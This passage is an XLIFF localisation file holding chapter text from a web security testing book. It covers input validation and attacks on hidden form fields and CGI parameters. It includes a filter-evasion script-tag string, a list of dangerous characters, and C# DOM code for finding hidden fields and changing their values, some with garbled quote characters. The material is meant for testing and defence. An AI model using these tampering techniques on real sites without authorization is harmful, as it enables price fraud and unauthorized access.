          <source>Validating Input</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>We return throughout this book to the subject of validating input. Thus, it is important for Web testers to understand what this important subject entails.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>There are two methods of validating input: white-lists and black-lists. &lt;span class="docEmphStrong"&gt;White-lists&lt;/span&gt; are effectively lists of acceptable inputs (or &amp;quot;friends&amp;quot; in the networking field, where these terms were introduced), and &lt;span class="docEmphStrong"&gt;black-lists&lt;/span&gt; are unacceptable inputs (or &amp;quot;foes&amp;quot;). But which is better? Should we specify the inputs we want to allow, or specify those that could be malicious?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>For whatever reason, many security-conscious programmers think of black-lists as the answer. After all, we &lt;span class="docEmphasis"&gt;know&lt;/span&gt; these things are bad, so why not prevent the user from entering them? Indeed, it is often easier to think of the characters (for example, &lt;tt&gt;' &amp;lt; &amp;gt; -- ;&lt;/tt&gt;) or strings fragments (for example, script tags or SQL statements) involved in certain attacks and specifically filter them from inputs.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>But there are inherent dangers in black-listing. Chief among these is making sure you have them all. If you leave one out, it will make it past your validation routine. This is known as a &lt;span class="docEmphStrong"&gt;false negative&lt;/span&gt;. Your validation routine was presented with a malicious input and did nothing.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Consider that all characters can be represented not only in their decimal form but also in various other encodings that the browser accepts. A space can be represented by the space character, the plus character '+', or by '%20'. Developers have to make sure not only to filter all the bad characters but also all the allowable encodings of bad characters. The same applies for longer strings.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>And what about attacks no one has thought of yet? History has shown over and over that black-lists change as attackers become more savvy, and systems get used for other than just their original purpose.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>A much better approach is to use white-lists, and it needn't be that difficult. White-lists are built by categorizing inputs to the application in various groups&amp;mdash;letters, numbers, alphanumeric characters, punctuation groups, allowed HTML entities, and so on&amp;mdash;and validating against these classes and the patterns they form. For example, a U.S. zip code would be a 5- or 9-character string of numbers, and e-mail addresses may be alphanumeric strings separated by &lt;span class="docEmphasis"&gt;limited&lt;/span&gt; punctuation characters (that is, &lt;tt&gt;. @ - _&lt;/tt&gt;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Using this method of white-listing, we should be able to separate the good inputs from the bad ones.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>This begs the question, what if we identify a bad input? Should we try to fix it? The short answer is no. It's much too difficult to try to perform correction without working your way deeper and deeper into a downward spiral of validation hell. Take, for example, the string &lt;tt&gt;&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;&lt;/tt&gt;. If we identify the malicious part (the &lt;tt&gt;&amp;lt;script&amp;gt;&lt;/tt&gt; tag) and remove it, we are left with another malicious string. Similar circumvention techniques exist for most black-list validation methods.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>The best course of action is to check that your application is receiving the expected input; if it's not, raise an error and &lt;span class="docEmphasis"&gt;stop processing&lt;/span&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch03lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch04.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Chapter 4. State-Based Attacks</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch03lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Chapter 4. State-Based Attacks</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>References</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch03lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch04lev1sec1.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch04.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>What's In This Chapter?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The concept of &lt;span class="docEmphStrong"&gt;state&lt;/span&gt;, or the ability to remember information as a user travels from page to page within a site, is an important one for Web testers. The Web is stateless in the sense that it does not remember which page a user is viewing or the order in which pages may be viewed. A user is always free to click the Back button or to force a page to reload. Thus, developers of Web applications must take it upon themselves to code state information so they can enforce rules about page access and session management. This chapter contains a series of attacks that will help determine if your Web application does this important task correctly and securely.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This chapter presents the most common and notorious Web vulnerabilities.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch04.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch04lev1sec2.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch04lev1sec1.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Introduction</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>All Web sites have a designated &amp;quot;home&amp;quot; or &amp;quot;default&amp;quot; page that Web designers intend as the starting point for visitors. From that start page, users can navigate the various pages of the site by clicking hyperlink objects embedded in the various pages of the site. Hyperlinks can be text, images, or other objects on the page.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This is the way it is supposed to work anyway. The problem is that the Web has no built-in mechanism that specifies which sequence of Web pages and forms are presented to the user. This aspect of the Web is called &lt;span class="docEmphStrong"&gt;statelessness&lt;/span&gt; to denote that each page is delivered to users without knowledge of where the users were previously or restrictions about where they can go next. Users can simply type in the URL of the page they want to load, skipping the start page and any other page they do not need to view.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If restrictions about page access are important, it is up to the Web application to enforce this.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Statelessness is ideal when browsing for information (or &lt;span class="docEmphStrong"&gt;surfing&lt;/span&gt;, as it has become commonly known), but more has been demanded of the Web than surfing static, standalone pages, and statelessness can lead to any number of failures and security violations. Imagine surfing past the pages where credit card numbers are entered and going directly to the page where the receipt is displayed&amp;mdash;obviously not something you want your own Web application to do!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The burden of including state information in a Web application falls squarely on the shoulders of the Web developer and the tools for adding such state information to a Web application are not particularly sophisticated.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The first option is using &lt;span class="docEmphStrong"&gt;forms&lt;/span&gt; and &lt;span class="docEmphStrong"&gt;CGI parameters&lt;/span&gt;, which allow the transfer of small amounts of data and information to be passed from page to page, essentially allowing the developer to bind together pairs of pages. More sophisticated state requirements mean that data needs to be stored, either on the client or the server, and then made available to various pages that have to check these values when they are loaded.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For example, we may store a flag on the server that indicates whether a user has entered a valid credit card. The Web application will then only allow the purchase pages to be loaded (and the purchase to be confirmed) if that flag is set to the correct value.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Shopping carts, purchase history, shipment tracking, and other such features require some state to be made available to the Web application. These features and the need to store state in general (and attacks on that state data) are the subject of this chapter.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 6 Hidden Fields</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>One of the most basic ways of preserving state in Web pages is to hide data in the page. That way as a user browses pages, state information can be carried along, allowing the Web application to give the user a smooth browsing experience.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The most common ways of doing this are to place data in hidden form fields or to append data as CGI parameters to hyperlinks. Both methods have the same effect, but hidden fields are less obvious to the user.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When a form is submitted to the Web server, each of the form fields is passed to the server as &lt;tt&gt;GET&lt;/tt&gt; or &lt;tt&gt;POST&lt;/tt&gt; parameters. (Don't worry about these at the moment. We look at these in detail in the next attack.) But it's not only the fields that the user can see that are passed; hidden fields are passed, too,</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>and the Web application can read them just like normal fields, and understand whatever data they contain. Developers sometimes favor hidden fields because they are easy to include at design time. Hidden fields have two other benefits. First, nontechnical people can maintain them in applications like FrontPage, Dreamweaver, and so on. Second, they are not obvious to a casual user.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The problem is that hackers are not casual users. They can and will read hidden fields. If the information these fields contain is useful in an attack, you can safely assume that hackers will use it that way.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can store numerous things in hidden form fields. Not all of them are state related, but you should treat them with suspicion when they are discovered. The basis of this attack is to look for hidden fields within forms, analyze what they are used for, and try to change their values in ways that would benefit an attacker.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The easiest way to determine if this attack is possible is to view the source of the page and search for the string &lt;tt&gt;"hidden"&lt;/tt&gt;. Most form elements follow this structure:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;input name="is" value="1234" ... &amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>along with the possibility of other, additional attributes. The type &lt;tt&gt;"hidden"&lt;/tt&gt; is one such attribute that appears in the source of a Web page, as follows:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;input name="id" value="1234" type="hidden"&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The most primitive way of modifying these form elements is to save the page locally (using File, Save As in your browser while the page is displayed) and remove the &lt;tt&gt;"type=hidden"&lt;/tt&gt; text from the source (remembering, as always, to change any relative links to absolute links so that everything still points to the correct location when you reload the locally saved copy of the page). This effectively changes the hidden field to a standard text box, which you can see and modify directly in the browser.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>An alternative way of identifying hidden fields is to use the browser's Document Object Model (DOM). Both Internet Explorer and Firefox have programming interfaces that allow developers to query the document within the browser and change some of its attributes. This functionality was originally intended for dynamic HTML so that scripting languages like JavaScript or VBScript could implement dynamic UI functionality, as described in &lt;a class="docLink" href="ch03.html#ch03"&gt;Chapter 3&lt;/a&gt;, &amp;quot;Attacking the Client.&amp;quot;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Consider the DOM code that follows, which iterates over a document in Internet Explorer and prints the names and values of all hidden fields:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>using System;
using mshtml; // access to IE's DOM
  IHTMLElementCollection tags;  // interface to HTML
   document

  // iterate through all HTML tags
  tags = HTMLDocument.all;
  foreach (IHTMLElement tag in tags)
  {
    // Is the current tag an input tag?
    if (string.Compare(tag.tagName,?INPUT?,true) == 0)
    {
      // cast to an input tag
      IHTMLInputElement inputTag =
   (IHTMLInputElement)tag;

      // Is it a hidden input field?
      if (inputTag.type==?hidden?)
      {
        Console.Write(?hidden form field
   ??+inputTag.name+???+
            ?found. Value is ??+ inputTag.value+?? ?

        // change the field value here
        //  inputTag.value=="somevalue";

      }
   }
}</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It is straightforward to modify this code to change any of the hidden field values to whatever value an attacker considers advantageous.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If you don't want to write the code yourself, the PageSpy tool on the CD in the back of this book uses this technique to list the hidden fields on a page and allow changes&amp;mdash;all from a simple graphical user interface (GUI).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Perform This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>There is no easy recipe for this attack; it all depends on what hidden fields you find on the page and the data they contain. The most universally useful advice is to change values of hidden form fields and see what happens as subsequent pages load. This should make problems with hidden fields apparent. Consider the following example.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A really naive mistake that early Web developers made often and that people still make today is saving product information on a page and passing that information to subsequent pages as in the application shown in &lt;a class="docLink" href="#ch04fig01"&gt;Figure 4-1&lt;/a&gt;. For example, as in &lt;a class="docLink" href="#ch04fig02"&gt;Figure 4-2&lt;/a&gt;, we may want to save a product's price in a hidden field to help the server calculate totals as the user browses a site. If an attacker recognizes this field and modifies it, he can reduce the price of the product to whatever he likes.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 4-1. An e-commerce application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 4-2. Viewing the source of the application reveals a hidden field with the item's price. What would happen if we changed this value?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This is really the idea: Watch for information in all hidden fields, and ask yourself whether an attacker would find the information advantageous.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Another important thing to note is that hidden fields are data passed from a client machine to a Web server. Because hidden fields have no data type associated with them, changing their values to be illegal, overly long strings and special characters may result in crashing or otherwise adversely affecting the Web server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Finally, you can use hidden fields to store data such as the previous page visited or the last selected action. This data can ensure that users follow the required flow of the application and don't jump to pages they shouldn't be able to access. Hidden fields can also store session information, as we shall see in a later attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Avoid hidden fields wherever possible, and most especially on information like price, quantity, page sequence, and other information you do not want your users to change. Before using these fields for anything, evaluate the data that the field contains for its security risk. Where you use hidden fields, limit their exposure by obfuscating the field name (for example, by using something less obvious than &amp;quot;price&amp;quot; or &amp;quot;password&amp;quot;) and encrypting or hashing the value to something less recognizable to the attacker.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This technique, however, relies on security by obscurity, and is almost always broken over time. Something named &lt;tt&gt;cX24y&lt;/tt&gt; is no more secure than something named &lt;tt&gt;price&lt;/tt&gt;, but it is harder to tell what the former is and determine if it is important. If you do use hidden fields for something (they are not entirely evil&amp;mdash;a common usage is to include them in search forms so the script that performs the functionality knows how to &amp;quot;brand&amp;quot; or frame the results), ensure that the data is what you expect. Attackers can and will modify these values.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 7 CGI Parameters</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Although hidden form fields are a good way of passing data between pages, there is a big drawback in using this method: The user has to submit a form to an &amp;quot;action handler,&amp;quot; usually by pressing a button. It may seem like a small point, but users are more used to clicking on hyperlinks or images for their navigation than form Submit buttons.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>CGI parameters are ideal for this task. After the parameters reach the server they are accessed in the same way as form fields. (See the difference between &lt;tt&gt;GET&lt;/tt&gt; and &lt;tt&gt;POST&lt;/tt&gt; form methods in the next sidebar, &amp;quot;&lt;a class="docLink" href="#ch04sb01"&gt;The Difference Between &lt;tt&gt;GET&lt;/tt&gt; and &lt;tt&gt;POST&lt;/tt&gt; Parameters&lt;/a&gt;.&amp;quot;) You easily can attach CGI parameters to any hyperlink.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Perform This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>CGI parameters are passed in a page request's URL after the ? character and are name-value pairs separated by &amp;amp; characters.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 4-3. Example of CGI parameters in a browser's address bar.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It's easy to tell if the current page uses CGI parameters, because they will be clearly shown on the browser's address bar. Links from a given page and their parameters should display on the browser's status bar if this functionality is enabled.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 4-4. CGI parameters in the status bar when a user hovers over a link.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Other than their location, we attack CGI parameters in the same way that we attacked hidden fields.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Perform This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>There is no single way of performing this attack. From an attacker's point of view, it all depends on what parameters he sees being passed from page to page and what their values are. As with the previous attack, we have to consider what advantage the information contained in the parameters represents to an attacker.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Begin by browsing your target site and noting the address bar. Also use your mouse to hover over clickable objects and note the URL that's usually shown at the bottom of the screen in the information bar. The data in a URL after the question mark are CGI parameters. We need to understand what the data represents and whether its exposure would benefit an attacker.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can modify CGI parameters by editing the page's HTML, as in the hidden forms attack earlier, but for &lt;tt&gt;GET&lt;/tt&gt; parameters, it is usually much easier to request a target page, change the values in the browser's address bar, and request the page again. There are many attacks against CGI parameters, all of which overlap with other attacks discussed in this book.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For example, if a parameter looks like it's to be used to select an item from a database (that is, the URL looks something like &lt;a class="docLink" target="_blank" href="http://www.companytotest.com?item=1234"&gt;http://www.companytotest.com?item=1234&lt;/a&gt;), try changing the value and seeing what happens.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch04fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
